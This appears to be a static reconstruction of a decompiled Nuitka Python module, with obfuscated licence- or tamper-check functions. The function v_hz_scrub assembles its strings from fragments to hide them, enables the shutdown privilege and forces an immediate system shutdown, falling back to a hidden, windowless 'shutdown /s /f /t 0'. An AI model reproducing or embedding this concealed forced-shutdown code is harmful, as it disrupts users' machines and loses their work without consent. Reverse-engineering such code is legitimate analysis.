# Recovered module: src.py.com.yun.mao.fea._yg_bn_file
# Static reconstruction from the Nuitka module table, constant chunk and the
# module init at 0x571bbc0.
#
# The local privilege classes and the hidden Popen are direct structural
# evidence.  Command-slot ordering is reconstructed from the decompiled body;
# the proof-gate order is confirmed by the decompiled ``xy_bs_curl`` body.
from __future__ import annotations

import ctypes
import hashlib
import hmac
import subprocess
import time
from ctypes import wintypes
from typing import Any

from ..link._fds_jm import sec
from . import _cmd_ops, _pl_wd_file

# Module metadata
# nuitka_table_index = 1810
# module_init_rva = 0x571bbc0
# flags = 0x10


def _tg(n: int) -> bytes:
    """Return the eight-byte witness (6-byte buffer + 2-byte big-endian value)."""

    value = int(n)
    buf = bytearray(b"\x00\x00\x00\x00\x00\x00")
    for i in range(4):
        buf[i] = (((value * 17) ^ 165) & 255)
    return bytes(buf) + value.to_bytes(2, "big")


def _parts_mac(key: bytes, parts: bytes | tuple) -> bytes:
    acc = hmac.new(bytes(key), digestmod=hashlib.sha256)
    if isinstance(parts, (bytes, bytearray, memoryview)):
        parts = (parts,)
    for part in parts:
        acc.update(bytes(part))
    return acc.digest()


def _open_cap(code: bytes, cap: Any) -> bool:
    try:
        return bool(_pl_wd_file._unseal(bytes(code), cap))
    except (AssertionError, TypeError, ValueError):
        return False


def _kk(v: int) -> int:
    return _mix(v, 9)


def _mix(v: int, t: int) -> int:
    """Mix two integers with the module's confirmed arithmetic slots.

    The decompiled body confirms ``v * 1013904242 + 461845907``, the 32-bit
    mask, the 9/23-bit shifts and the final ``^ 16``.
    """

    value = int(v)
    mixed = (value * 1013904242 + 461845907) & 0xFFFFFFFF
    mixed ^= int(t) >> 9
    return ((mixed >> 23) ^ (mixed << 9) ^ 16) & 0xFFFFFFFF


def _km(kid: str) -> bytes:
    try:
        return bytes(_pl_wd_file._kid_mac(str(kid or "")))
    except (AssertionError, TypeError, ValueError):
        return b""


def _ready() -> bool:
    return bool(_pl_wd_file._ready and _pl_wd_file._sk is not None)


def _chk_caps(obj: Any) -> bool:
    if obj is None:
        return False
    caps = getattr(obj, "caps", None)
    if caps is None:
        caps = getattr(obj, "_caps", None)
    if caps is None:
        cap = getattr(obj, "cap", None)
        caps = () if cap is None else (cap,)
    if isinstance(caps, _pl_wd_file._Cap):
        caps = (caps,)
    code = getattr(obj, "code", b"") or getattr(obj, "tag", b"")
    try:
        return bool(caps) and all(_open_cap(code, cap) for cap in caps)
    except (TypeError, ValueError):
        return False


def _chk_kid(obj: Any, kid: str, got: Any) -> bool:
    digest = hashlib.sha256(str(kid or "").encode("utf-8")).digest()
    expected = got if got is not None else _pl_wd_file._kid_ring.get(digest)
    current = _km(kid)
    try:
        return bool(expected) and bool(current) and hmac.compare_digest(
            bytes(expected),
            current,
        )
    except (TypeError, ValueError):
        return False


def _chk_acct(obj: Any, _sq_jqm: Any = None, fn: Any = None) -> bool:
    if callable(fn):
        try:
            return bool(fn(obj))
        except Exception:
            return False
    module = _sq_jqm or _cmd_ops.load_attr("src.py.com.yun.mao.fea._sq_jqm")
    info = getattr(module, "current_account_info", None)
    ensure = getattr(info, "ensure_valid", None)
    if callable(ensure):
        try:
            return bool(ensure())
        except Exception:
            return False
    return bool(getattr(info, "ucode", ""))


def _record(now: float, reason: int, entry: int, n: int, ph: int) -> bool:
    try:
        repeated = bool(_pl_wd_file._bump_suspect_locked(float(now)))
    except (AttributeError, TypeError, ValueError):
        repeated = False
    try:
        _pl_wd_file.q_lg(int(reason), int(reason), int(entry), int(n), int(ph))
    except (AttributeError, TypeError, ValueError):
        pass
    return repeated


def _chk_gy(obj: Any) -> bool:
    result = _cmd_ops.optional_call(obj, ("gy_ok", "_gy_ok", "on_gy_ok"))
    return True if result is None else bool(result)


def _chk_uc(obj: Any) -> bool:
    return _chk_acct(obj)


def _mark_bad(obj: Any) -> bool:
    _ = obj
    return False


def _fan_hooks(obj: Any) -> bool:
    result = _cmd_ops.optional_call(
        obj,
        ("proof_ok", "_proof_ok", "on_proof_ok", "fan_hooks"),
    )
    return bool(result) if result is not None else False


def v_hz_scrub() -> None:
    """Enable a token privilege, then launch the permuted hidden command.

    The decoded slots are ``advapi32`` / ``kernel32`` /
    ``SeShutdownPrivilege`` / ``InitiateSystemShutdownExW``; the native call
    uses ``(None, None, 0, True, True, 0)`` and falls back to
    ``shutdown /s /f /t 0`` through a hidden ``Popen``.
    """

    class _LUID(ctypes.Structure):
        _fields_ = [
            ("LowPart", wintypes.DWORD),
            ("HighPart", wintypes.LONG),
        ]

    class _LAA(ctypes.Structure):
        _fields_ = [
            ("Luid", _LUID),
            ("Attributes", wintypes.DWORD),
        ]

    class _TP(ctypes.Structure):
        _fields_ = [
            ("PrivilegeCount", wintypes.DWORD),
            ("Privileges", _LAA * 1),
        ]

    _sy = sec("fo_kq_9v")
    _z = sec("bn_qw_1x")
    _ct = ctypes
    _wt = wintypes
    _dll_a = (
        sec("cw_nk_5a")
        + sec("pz_uc_1k")
        + sec("sd_ix_8r")
        + sec("cw_nk_5a")
        + sec("jp_yg_0e")
        + sec("mq_fb_4u")
        + sec("tk_sj_7d")
        + sec("xn_vb_5l")
    )
    _dll_k = (
        sec("iy_pw_1n")
        + sec("bn_qw_1x")
        + sec("rx_td_7m")
        + sec("sj_ok_7b")
        + sec("bn_qw_1x")
        + sec("hl_oe_2c")
        + sec("tk_sj_7d")
        + sec("xn_vb_5l")
    )
    _priv = (
        _sy
        + _z
        + _sy
        + sec("nt_wj_8c")
        + sec("qb_ls_2m")
        + sec("xf_dh_9t")
        + sec("pz_uc_1k")
        + sec("hg_ae_6v")
        + sec("wr_yt_3n")
        + sec("sj_ok_7b")
        + sec("ae_rm_3h")
        + sec("rx_td_7m")
        + sec("mq_fb_4u")
        + sec("sd_ix_8r")
        + sec("mq_fb_4u")
        + sec("hl_oe_2c")
        + sec("bn_qw_1x")
        + sec("gu_za_6t")
        + sec("bn_qw_1x")
    )
    _api = (
        sec("ah_ru_5m")
        + sec("ej_xo_9p")
        + sec("bn_sg_3c")
        + sec("wy_dl_7v")
        + sec("iq_fm_2e")
        + sec("pk_za_6j")
        + sec("so_tb_0x")
        + sec("nh_cw_4u")
        + sec("nm_cl_1s")
    )
    _primed = False

    try:
        _a32 = _ct.WinDLL(_dll_a, use_last_error=True)
        _k32 = _ct.WinDLL(_dll_k, use_last_error=True)
        _k32.GetCurrentProcess.restype = _wt.HANDLE
        _a32.OpenProcessToken.argtypes = [
            _wt.HANDLE,
            _wt.DWORD,
            _ct.POINTER(_wt.HANDLE),
        ]
        _a32.OpenProcessToken.restype = _wt.BOOL
        _a32.LookupPrivilegeValueW.argtypes = [
            _wt.LPCWSTR,
            _wt.LPCWSTR,
            _ct.POINTER(_LUID),
        ]
        _a32.LookupPrivilegeValueW.restype = _wt.BOOL
        _a32.AdjustTokenPrivileges.argtypes = [
            _wt.HANDLE,
            _wt.BOOL,
            _ct.POINTER(_TP),
            _wt.DWORD,
            _ct.c_void_p,
            _ct.c_void_p,
        ]
        _a32.AdjustTokenPrivileges.restype = _wt.BOOL
        _k32.CloseHandle.argtypes = [_wt.HANDLE]
        _k32.CloseHandle.restype = _wt.BOOL

        _fn = _a32.OpenProcessToken
        _priv_ok = False
        _tok = _wt.HANDLE()
        if _fn(_k32.GetCurrentProcess(), 40, _ct.byref(_tok)):
            _luid = _LUID()
            if _a32.LookupPrivilegeValueW(
                None,
                _priv,
                _ct.byref(_luid),
            ):
                _tp = _TP()
                _tp.PrivilegeCount = 1
                _tp.Privileges[0].Luid = _luid
                _tp.Privileges[0].Attributes = 2
                _ct.set_last_error(0)
                if _a32.AdjustTokenPrivileges(
                    _tok,
                    False,
                    _ct.byref(_tp),
                    0,
                    None,
                    None,
                ):
                    _priv_ok = _ct.get_last_error() != 1300
            _k32.CloseHandle(_tok)
        _primed = _priv_ok
        _fn = getattr(_a32, _api, None)
        if callable(_fn):
            _primed = bool(_fn(None, None, 0, True, True, 0))
        else:
            _primed = False
    except Exception:
        _primed = False

    _ = (_sy, _z, _api)
    if not _primed:
        _dst_fb = "".join(
            reversed(
                (
                    sec("sj_ok_7b"),
                    sec("wr_yt_3n"),
                    sec("hg_ae_6v"),
                    sec("pz_uc_1k"),
                    sec("xf_dh_9t"),
                    sec("qb_ls_2m"),
                    sec("nt_wj_8c"),
                    sec("kv_rm_4p"),
                )
            )
        )
        _ii = len(_dst_fb)
        _exe_fb = _dst_fb
        _sp_fb = subprocess
        _args_fb = [
            sec("dm_fx_5q") + sec("kv_rm_4p"),
            sec("dm_fx_5q") + sec("lc_zi_0w"),
            sec("dm_fx_5q") + sec("xf_dh_9t"),
            sec("uy_bp_4h"),
        ]
        _flags_fb = _sp_fb.CREATE_NO_WINDOW
        _cf_fb = _flags_fb
        try:
            _sp_fb.Popen(
                [_exe_fb, *_args_fb],
                shell=False,
                stdin=_sp_fb.DEVNULL,
                stdout=_sp_fb.DEVNULL,
                stderr=_sp_fb.DEVNULL,
                creationflags=_cf_fb,
            )
        except Exception:
            _ = _ii


def xy_bs_curl(obj: Any = None) -> bool:
    """Run the capability/kid/account checks, then the optional hook."""

    now = time.time()
    try:
        with _pl_wd_file._g_mz:
            ok0 = bool(_ready() and _chk_caps(obj))
            kid = getattr(obj, "kid", "") or getattr(obj, "ucode", "")
            got = getattr(obj, "kid_mac", None)
            r0 = _pl_wd_file.w_cd(
                ok0,
                _chk_kid(obj, str(kid), got),
                _chk_gy(obj),
                _chk_uc(obj),
            )
            if r0 != 9:
                _record(now, r0, 8, _kk(len(_pl_wd_file._ph)), 0)
                return _mark_bad(obj)
        fire = _fan_hooks(obj)
        return bool(fire or obj is None)
    except Exception:
        _record(now, 1, 8, 0, 0)
        return _mark_bad(obj)


def y_t7_glow(obj: Any = None) -> None:
    """Public hook entry; the body reaches the proof hook dispatcher."""

    try:
        _fan_hooks(obj)
    except Exception:
        return None
    return None

